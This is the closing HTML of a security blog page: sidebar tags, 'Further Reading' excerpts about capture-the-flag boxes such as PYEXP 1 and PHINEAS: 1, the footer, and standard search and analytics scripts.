2</a><li><a href="/posts/CRTP/">Attacking and Defending Active Directory Lab Course</a><li><a href="/posts/goals/">Goals</a><li><a href="/posts/speed/">Speed</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/path-variable/">Path Variable</a> <a class="post-tag" href="/tags/base64/">base64</a> <a class="post-tag" href="/tags/cp/">cp</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/disk-group/">Disk Group</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/docker-escape/">Docker Escape</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/PYEXP_1/"><div class="card-body"> <span class="timeago small" >Apr 18, 2021<i class="unloaded">2021-04-18T12:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PYEXP 1</h3><div class="text-muted small"><p> Overview “PYEXP: 1” is an interesting box as it teaches the concept of brute-forcing,database enumeration and exploiting dangerous python function. Box Difficulty Link ...</p></div></div></a></div><div class="card"> <a href="/posts/PHINEAS_1/"><div class="card-body"> <span class="timeago small" >May 1, 2021<i class="unloaded">2021-05-01T20:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PHINEAS: 1</h3><div class="text-muted small"><p> Overview Great box to practice enumeration, modifying public exploit to suit our needs and exploiting Python pickles. Box Difficulty Link Easy-Medium ...</p></div></div></a></div><div class="card"> <a href="/posts/ONSYSTEM-HANNAH/"><div class="card-body"> <span class="timeago small" >Apr 15, 2021<i class="unloaded">2021-04-15T12:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OnSystem ShellDredd</h3><div class="text-muted small"><p> Overview “ONSYSTEM: SHELLDREDD #1 HANNAH” is an easy boxes which is great for beginners to learn more about enumerating the poorly configured FTP port to search for sensitive information and escal...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/PYEXP_1/" class="btn btn-outline-primary" prompt="Older"><p>PYEXP 1</p></a> <a href="/posts/PHINEAS_1/" class="btn btn-outline-primary" prompt="Newer"><p>PHINEAS: 1</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/am-a-circle">am-a-circle</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/path-variable/">Path Variable</a> <a class="post-tag" href="/tags/base64/">base64</a> <a class="post-tag" href="/tags/cp/">cp</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/disk-group/">Disk Group</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/docker-escape/">Docker Escape</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
